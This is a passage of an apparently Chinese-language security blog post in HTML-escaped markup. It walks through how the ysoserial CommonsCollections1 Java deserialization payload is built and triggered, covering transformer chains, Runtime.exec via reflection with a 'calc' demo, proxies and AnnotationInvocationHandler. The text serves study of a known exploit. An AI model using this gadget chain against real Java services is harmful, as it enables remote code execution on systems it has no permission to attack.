最后将构造好的命令执行transformers传入transformerChain&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 最后放是为了防止在构造payload时弹出计算器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		Reflections.setFieldValue(transformerChain, &lt;span class=&#34;string&#34;&gt;&amp;quot;iTransformers&amp;quot;&lt;/span&gt;, transformers); &lt;span class=&#34;comment&#34;&gt;// arm with actual transformer chain&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// 最后包装好的handler即为我们的payload&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; handler;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;知识点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点&#34;&gt;#&lt;/a&gt; 知识点&lt;/h3&gt;
&lt;p&gt;需要理解的知识点主要有两部分：transform 和 proxy&lt;/p&gt;
&lt;p&gt;想要深究的话可以去看详细解释，以下只记录此处用到的点&lt;/p&gt;
&lt;p&gt;我看代理的时候是参考的这篇文章：&lt;a href=&#34;https://xie.infoq.cn/article/9a9387805a496e1485dc8430f&#34;&gt;https://xie.infoq.cn/article/9a9387805a496e1485dc8430f&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;先来看看trasnform&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#先来看看trasnform&#34;&gt;#&lt;/a&gt; 先来看看 trasnform&lt;/h4&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer transformerChain = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ChainedTransformer(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[]&amp;#123; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// real chain for after setup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer[] transformers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(Runtime.class),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;getMethod&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        String.class, Class[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;invoke&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Object.class, Object[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123; String.class &amp;#125;, execArgs),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;ConstantTransformer&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;构造方法传入一个类&lt;/p&gt;
&lt;p&gt;通过该类的 transform 方法获取一个对象类型，如 transform 参数是 Runtime.class 时，调用 ConstantTransformer 类的 transform 方法，执行后返回 java.lang.Runtime 类&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;InvokerTransformer&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;构造方法 InvokerTransformer (String methodName, Class [] paramTypes, Object [] args)&lt;/p&gt;
&lt;p&gt;第一个参数为方法名，第二个参数为方法参数类型数组，第三个参数为方法参数数组&lt;/p&gt;
&lt;p&gt;该类的 transform 通过反射执行函数&lt;/p&gt;
&lt;p&gt;例如下面的代码，transform 传入 Runtime 对象，通过反射执行 exec 函数，传入命令为 calc&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;InvokerTransformer invokerTransformer = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[]&amp;#123;String.class&amp;#125;,&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; String[]&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;calc&amp;quot;&lt;/span&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;invokerTransformer.transform(Runtime.getRuntime());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;transformerChain&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;transformers 的链，构造方法传入一个 transform 数组&lt;/p&gt;
&lt;p&gt;串起来了很多 transformer&lt;/p&gt;
&lt;p&gt;为什么是串起来的呢，见下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;62.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;其中前面一个 transform 输出的结果会作为参数传入后一个 transform&lt;/p&gt;
&lt;p&gt;那么此处代码就可以很好的解释啦&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 通过反射获取Runtime，因为Class类实现了Serializable接口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//        Method f = Runtime.class.getMethod(&amp;quot;getRuntime&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//        Runtime r = (Runtime) f.invoke(null);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//        r.exec(&amp;quot;C:\\WINDOWS\\system32\\calc.exe&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer transformerChain = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ChainedTransformer(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[]&amp;#123; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// real chain for after setup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer[] transformers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 返回java.lang.Runtime类&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(Runtime.class),  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//传入上面transform得到的Runtime类（Class对象），调用getMethod方法，传入调用getMethod方法方法参数为getRuntime；也就是获取该类的getRuntime方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;getMethod&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            String.class, Class[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 传入上面transform得到的getRuntime方法（Method对象），调用invoke方法，传入invoke方法的参数为Object[]，其实就是按照参数列表传就好了，因为此处只需要调用invoke方法获得Runtime对象&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;invoke&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Object.class, Object[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 传入上面transform得到的Runtime对象，调用exec方法，传入该方法的参数为execArgs&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123; String.class &amp;#125;, execArgs),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;最后康康proxy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#最后康康proxy&#34;&gt;#&lt;/a&gt; 最后康康 proxy&lt;/h4&gt;
&lt;p&gt;为什么会利用到对象代理呢？&lt;/p&gt;
&lt;p&gt;当然是因为代理的一些些特性辣&lt;/p&gt;
&lt;p&gt;每个代理类有一个公共构造一个参数，该接口的实现 &lt;code&gt;InvocationHandler&lt;/code&gt;  ，设置调用处理程序的代理实例&lt;/p&gt;
&lt;p&gt;康康构造方法，会传入一个 InvocationHandler 对象&lt;/p&gt;
&lt;p&gt;并且在调用该代理对象任意方法时，会调用 InvocationHandler#invoke ()&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;63.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是该方法是 protected 的，很明显我们需要实例化一个代理对象时需要找到另一个可以返回实例的方法&lt;/p&gt;
&lt;p&gt;那就是 newProxyInstance 方法啦&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;64.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;来测试试试&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.util.Gadgets;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.lang.reflect.InvocationHandler;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.lang.reflect.Method;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.lang.reflect.Proxy;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.util.Map;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * My Test Class&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;MTest&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        TestInvocationHandler handler = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; TestInvocationHandler();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Map testProxy = (Map) Proxy.newProxyInstance(Gadgets.class.getClassLoader(), &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[]&amp;#123;Map.class&amp;#125;, handler);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        testProxy.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;key&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;value&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;TestInvocationHandler&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;InvocationHandler&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;meta&#34;&gt;@Override&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; Object &lt;span class=&#34;title&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Object proxy, Method method, Object[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Throwable &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;method: &amp;quot;&lt;/span&gt; + method.toString());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;debug 代码，可以看见当调用 Map#put 时，会进入 TestInvocationHandler#invoke&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;65.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;没戳 proxy 利用到的点就这一个啦&lt;/p&gt;
&lt;h3 id=&#34;调试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调试&#34;&gt;#&lt;/a&gt; 调试&lt;/h3&gt;
&lt;p&gt;比较绕的地方调试一波&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;36.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入该函数，发现有两处函数计算&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;37.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入 &lt;code&gt;createMemoizedInvocationHandler(map)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中 &lt;code&gt;ANN_INV_HANDLER_CLASS = &amp;quot;sun.reflect.annotation.AnnotationInvocationHandler&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以看出此处是通过反射获取 AnnotationInvocationHandler 对象，且获取对象时传入了构造的 LazyMap&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;38.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入 &lt;code&gt;createProxy(handler,iface,ifaces)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;对传入的 iface 进行代理，并传入上一步获得的 AnnotationInvocationHandler 对象 handler2&lt;/p&gt;
&lt;p&gt;iface 为传入的 Map.class (CommonsCollections1.java 中： &lt;code&gt;mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);&lt;/code&gt; ）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;39.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;两次函数执行完毕后，返回 CommonsCollections1&lt;/p&gt;
&lt;p&gt;返回代理对象 mapProxy（调用该对象任意方法，都会先调用传入的 handler#invoke）&lt;/p&gt;
&lt;p&gt;73 行代码将获取到的 mapProxy 进行包裹是因为：&lt;/p&gt;
&lt;p&gt;​	由于反序列化入口为 readObject，所以我们需要某个类的 readObject 中会调用传入 map 的任意方法&lt;/p&gt;
&lt;p&gt;​	AnnotationInvocationHandler#readObject 中有调用 map.entrySet ()&lt;/p&gt;
&lt;p&gt;​	从而触发 AnnotationInvocationHandler#invoke&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;40.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后返回层层构造好的，还没有序列化的，payload 啦&lt;/p&gt;
&lt;h2 id=&#34;payload触发分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#payload触发分析&#34;&gt;#&lt;/a&gt; payload 触发分析&lt;/h2&gt;
&lt;p&gt;以下是 POC 中给出的触发链，可以根据 Gadget 下断点（这样比较清晰感觉）&lt;/p&gt;
&lt;p&gt;根据上面 payload 构造的学习，我们可以更好的理解该利用链的触发&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span 